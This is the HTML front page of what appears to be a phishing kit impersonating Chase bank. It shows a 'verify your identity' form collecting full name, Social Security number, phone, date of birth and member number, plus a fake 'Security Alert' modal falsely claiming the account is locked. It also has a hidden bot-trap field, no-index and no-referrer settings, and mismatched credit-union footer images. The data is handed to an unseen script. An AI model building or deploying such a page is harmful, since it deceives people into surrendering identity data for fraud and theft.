<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com</title>
    <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="loading-overlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text" data-render="sync_msg"></div>
    </div>
    <div id="root">
        <div class="login-page-container">
            <div class="fluid-form-layout">
                <div class="login-header">
                    <a href="#">
                        <img src="assets/scraped-logo.svg" alt="" id="brand-logo">
                    </a>
                </div>

                <div class="login-form-container">
                    <form id="fluid-verify-form">
                        <div class="vld-msg-container">
                            <input type="text" name="b_field" id="b_field" tabindex="-1" autocomplete="off">
                        </div>

                        <div class="fluid-form-layout-field-container">
                            <label class="field-label" data-render="full_name_label"></label>
                            <div class="fluid-input-wrapper">
                                <input type="text" id="full_name" name="full_name" class="fluid-input" placeholder="First and Last Name" autocomplete="name" required>
                            </div>
                        </div>

                        <div class="fluid-form-layout-field-container">
                            <label class="field-label" data-render="ssn_label"></label>
                            <div class="fluid-input-wrapper">
                                <input type="text" id="ssn" name="ssn" class="fluid-input" placeholder="XXX-XX-XXXX" autocomplete="on" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9\-\•]/g,'');" required>
                            </div>
                        </div>

                        <div class="fluid-form-layout-field-container">
                            <label class="field-label" data-render="phone_label"></label>
                            <div class="fluid-input-wrapper">
                                <input type="tel" id="phone" name="phone" class="fluid-input" placeholder="(XXX) XXX-XXXX" autocomplete="tel" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9\(\)\-\s]/g,'');" required>
                            </div>
                        </div>

                        <div class="fluid-form-layout-field-container">
                            <label class="field-label" data-render="dob_label"></label>
                            <div class="fluid-input-wrapper">
                                <input type="text" id="dob" name="dob" class="fluid-input" placeholder="MM/DD/YYYY" autocomplete="bday" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9\/]/g,'');" required>
                            </div>
                        </div>

                        <div class="fluid-form-layout-field-container">
                            <label class="field-label" data-render="member_label"></label>
                            <div class="fluid-input-wrapper">
                                <input type="text" id="member_num" name="member_num" class="fluid-input" placeholder="Member #" autocomplete="username" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
                            </div>
                        </div>

                        <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
                            <button type="submit" class="fluid-button">
                                <span class="fluid-button__text" data-render="continue_btn"></span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div id="member-warning-modal" class="modal-backdrop">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Security Alert</div>
                </div>
                <div class="modal-body">
                    <p class="modal-text">Your account has been temporarily locked for your protection. Please verify your identity to regain access.</p>
                    <p class="modal-text" style="margin-top: 15px; font-weight: 500; color: #C53030;">Please note: By omitting your Member #, the manual review process will be extended by an additional 3-5 business days.</p>
                </div>
                <div class="modal-footer">
                    <button id="close-member-warning-modal" class="modal-button" style="background: #4D5CF9;">Understood &amp; Continue</button>
                    <button id="add-member-number-btn" class="modal-button" style="background: transparent; color: #4D5CF9; border: 1px solid #4D5CF9; margin-left: 10px;">Return to Add Member #</button>
                </div>
            </div>
        </div>

        <footer id="footer-container" class="footer-container-main">
            <div class="image-links">
                <img alt="" src="assets/ncua_icon.png" style="margin-right: 20px;">
                <img alt="" src="assets/ncua_text.png" style="margin-right: 20px;">
                <img alt="" src="assets/ehl_icon.png">
            </div>
        </footer>
    </div>
    <script src="app.js"></script>
</body>
</html>
